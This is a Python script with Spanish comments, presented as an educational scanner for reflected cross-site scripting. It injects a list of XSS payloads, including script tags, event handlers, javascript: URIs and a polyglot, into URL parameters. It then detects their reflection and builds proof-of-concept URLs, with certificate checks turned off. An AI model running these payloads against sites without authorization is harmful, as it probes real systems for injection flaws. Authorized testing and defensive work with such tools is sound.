#!/usr/bin/env python3
"""
Scanner de XSS Básico
=====================
Herramienta educativa para detectar posibles vulnerabilidades XSS.
Úsala SOLO en sistemas donde tengas autorización.

Uso:
    python xss_scanner.py <url_con_parametro>
    
Ejemplo:
    python xss_scanner.py "http://localhost/search?q=test"
"""

import requests
import sys
import re
from urllib.parse import urlparse, parse_qs, urlencode, quote
import urllib3

# Desactivar warnings de SSL
urllib3.disable_warnings()


def banner():
    print("""
    ╔═══════════════════════════════════════════════════╗
    ║            SCANNER DE XSS                         ║
    ║          Herramienta Educativa                    ║
    ╚═══════════════════════════════════════════════════╝
    """)


# Payloads XSS para probar
XSS_PAYLOADS = [
    # Básicos
    '<script>alert("XSS")</script>',
    '<script>alert(1)</script>',
    '<ScRiPt>alert(1)</ScRiPt>',
    
    # Sin tags script
    '<img src=x onerror=alert(1)>',
    '<svg onload=alert(1)>',
    '<body onload=alert(1)>',
    '<input onfocus=alert(1) autofocus>',
    '<marquee onstart=alert(1)>',
    '<video src=x onerror=alert(1)>',
    '<audio src=x onerror=alert(1)>',
    '<details open ontoggle=alert(1)>',
    
    # Con eventos
    '" onmouseover="alert(1)',
    "' onmouseover='alert(1)",
    '" onfocus="alert(1)" autofocus="',
    "' onfocus='alert(1)' autofocus='",
    
    # Escape de atributos
    '"><script>alert(1)</script>',
    "'><script>alert(1)</script>",
    '</script><script>alert(1)</script>',
    
    # JavaScript URI
    'javascript:alert(1)',
    'javascript:alert(1)//',
    
    # Encoded
    '%3Cscript%3Ealert(1)%3C/script%3E',
    '&lt;script&gt;alert(1)&lt;/script&gt;',
    
    # Polyglots
    'jaVasCript:/*-/*`/*\\`/*\'/*"/**/(/* */oNcLiCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e',
]

# Patrones que indican reflexión del payload
REFLECTION_PATTERNS = [
    r'<script[^>]*>alert\([^)]*\)</script>',
    r'<img[^>]*onerror\s*=\s*alert',
    r'<svg[^>]*onload\s*=\s*alert',
    r'<body[^>]*onload\s*=\s*alert',
    r'on\w+\s*=\s*["\']?alert',
    r'javascript:\s*alert',
]


def test_xss(url, params, param_to_test, payload, headers=None):
    """Prueba un payload XSS en un parámetro"""
    test_params = params.copy()
    test_params[param_to_test] = payload
    
    try:
        response = requests.get(
            url,
            params=test_params,
            headers=headers,
            timeout=10,
            verify=False,
            allow_redirects=True
        )
        return response.text, response.status_code
    except Exception as e:
        return None, None


def check_reflection(response_text, payload):
    """Verifica si el payload se refleja en la respuesta"""
    if response_text is None:
        return False, None
    
    # Verificar reflexión directa
    if payload in response_text:
        return True, "Reflexión directa"
    
    # Verificar reflexión con decode
    decoded_payload = payload.replace('%3C', '<').replace('%3E', '>').replace('%22', '"').replace('%27', "'")
    if decoded_payload in response_text:
        return True, "Reflexión (decoded)"
    
    # Verificar patrones peligrosos
    for pattern in REFLECTION_PATTERNS:
        if re.search(pattern, response_text, re.IGNORECASE):
            return True, f"Patrón peligroso detectado: {pattern[:30]}..."
    
    return False, None


def analyze_context(response_text, param_value):
    """Analiza el contexto donde se refleja el valor"""
    contexts = []
    
    if response_text is None:
        return contexts
    
    # Buscar el valor en diferentes contextos
    param_escaped = re.escape(param_value)
    
    # Contexto HTML
    if re.search(rf'>{param_escaped}<', response_text):
        contexts.append("HTML (entre tags)")
    
    # Contexto de atributo con comillas dobles
    if re.search(rf'="[^"]*{param_escaped}[^"]*"', response_text):
        contexts.append("Atributo HTML (comillas dobles)")
    
    # Contexto de atributo con comillas simples
    if re.search(rf"='[^']*{param_escaped}[^']*'", response_text):
        contexts.append("Atributo HTML (comillas simples)")
    
    # Contexto JavaScript
    if re.search(rf'<script[^>]*>[^<]*{param_escaped}[^<]*</script>', response_text, re.IGNORECASE):
        contexts.append("Dentro de <script>")
    
    # Contexto URL/href
    if re.search(rf'href\s*=\s*["\'][^"\']*{param_escaped}', response_text, re.IGNORECASE):
        contexts.append("Atributo href")
    
    # Contexto src
    if re.search(rf'src\s*=\s*["\'][^"\']*{param_escaped}', response_text, re.IGNORECASE):
        contexts.append("Atributo src")
    
    return contexts


def test_parameter(url, params, param_to_test, headers=None):
    """Prueba un parámetro con todos los payloads XSS"""
    print(f"\n[*] Probando parámetro: {param_to_test}")
    print(f"[*] Valor original: {params.get(param_to_test, '')}")
    print("-" * 50)
    
    findings = []
    
    # Primero, verificar si el valor se refleja
    original_value = params.get(param_to_test, "XSSTEST123")
    test_value = f"XSSTEST{id(url)}"  # Valor único para detectar reflexión
    
    test_params = params.copy()
    test_params[param_to_test] = test_value
    
    try:
        response = requests.get(url, params=test_params, headers=headers, timeout=10, verify=False)
        
        if test_value in response.text:
            print(f"[+] ¡El parámetro se refleja en la respuesta!")
            
            # Analizar contexto
            contexts = analyze_context(response.text, test_value)
            if contexts:
                print(f"[*] Contextos detectados: {', '.join(contexts)}")
        else:
            print(f"[-] El parámetro no se refleja directamente")
            print(f"[*] Continuando con pruebas de todos modos...")
    except Exception as e:
        print(f"[-] Error en prueba inicial: {e}")
    
    print("-" * 50)
    
    # Probar cada payload
    for i, payload in enumerate(XSS_PAYLOADS, 1):
        # Mostrar progreso
        sys.stdout.write(f"\r[*] Probando payload {i}/{len(XSS_PAYLOADS)}...")
        sys.stdout.flush()
        
        response_text, status_code = test_xss(url, params, param_to_test, payload, headers)
        
        is_reflected, reflection_type = check_reflection(response_text, payload)
        
        if is_reflected:
            finding = {
                'param': param_to_test,
                'payload': payload,
                'reflection_type': reflection_type,
                'status_code': status_code
            }
            findings.append(finding)
            
            print(f"\n\n    ╔══════════════════════════════════════════")
            print(f"    ║ ¡POSIBLE XSS ENCONTRADO!")
            print(f"    ╠══════════════════════════════════════════")
            print(f"    ║ Parámetro: {param_to_test}")
            print(f"    ║ Payload: {payload[:50]}...")
            print(f"    ║ Tipo: {reflection_type}")
            print(f"    ║ Status: {status_code}")
            print(f"    ╚══════════════════════════════════════════")
    
    print(f"\n[*] Pruebas completadas para {param_to_test}")
    return findings


def generate_poc(url, param, payload):
    """Genera URL de Proof of Concept"""
    parsed = urlparse(url)
    params = parse_qs(parsed.query)
    params = {k: v[0] if isinstance(v, list) else v for k, v in params.items()}
    params[param] = payload
    
    query_string = urlencode(params, safe='<>"\'/():;')
    return f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{query_string}"


def main():
    banner()
    
    if len(sys.argv) < 2:
        print("Uso: python xss_scanner.py <url_con_parametro>")
        print("\nEjemplo:")
        print('  python xss_scanner.py "http://localhost/search?q=test"')
        print('  python xss_scanner.py "http://localhost/page?name=john&id=1"')
        sys.exit(1)
    
    target_url = sys.argv[1]
    
    # Parsear URL
    parsed = urlparse(target_url)
    base_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
    params = parse_qs(parsed.query)
    
    # Convertir listas a valores únicos
    params = {k: v[0] if isinstance(v, list) else v for k, v in params.items()}
    
    if not params:
        print("[-] No se encontraron parámetros en la URL")
        print("[-] Asegúrate de incluir parámetros como: ?q=test")
        sys.exit(1)
    
    print(f"[*] URL base: {base_url}")
    print(f"[*] Parámetros encontrados: {list(params.keys())}")
    
    # Headers personalizados
    headers = {
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0'
    }
    
    all_findings = []
    
    # Probar cada parámetro
    for param in params.keys():
        findings = test_parameter(base_url, params, param, headers=headers)
        all_findings.extend(findings)
    
    # Resumen final
    print("\n" + "=" * 60)
    print("RESUMEN DE HALLAZGOS XSS")
    print("=" * 60)
    
    if all_findings:
        print(f"\n[!] Se encontraron {len(all_findings)} posibles vulnerabilidades XSS:\n")
        
        for i, finding in enumerate(all_findings, 1):
            print(f"{i}. Parámetro: {finding['param']}")
            print(f"   Payload: {finding['payload'][:60]}...")
            print(f"   Tipo de reflexión: {finding['reflection_type']}")
            
            # Generar PoC URL
            poc_url = generate_poc(target_url, finding['param'], finding['payload'])
            print(f"   PoC URL: {poc_url[:80]}...")
            print()
        
        print("\n[!] VERIFICACIÓN MANUAL REQUERIDA:")
        print("    1. Abre cada PoC URL en el navegador")
        print("    2. Verifica si se ejecuta JavaScript")
        print("    3. Si aparece alert(), es vulnerable")
        print("    4. Documenta los resultados")
        
        print("\n[!] TIPOS DE XSS A CONSIDERAR:")
        print("    - Reflejado: El payload está en la URL")
        print("    - Almacenado: Busca formularios que guarden datos")
        print("    - DOM: Revisa JavaScript del cliente")
    else:
        print("\n[+] No se detectaron reflexiones de payloads XSS")
        print("[*] Esto NO significa que sea seguro")
        print("[*] Considera:")
        print("    - Pruebas manuales con Burp Suite")
        print("    - XSS basado en DOM (requiere análisis de JS)")
        print("    - Payloads más específicos para el contexto")
    
    print("\n")


if __name__ == "__main__":
    main()
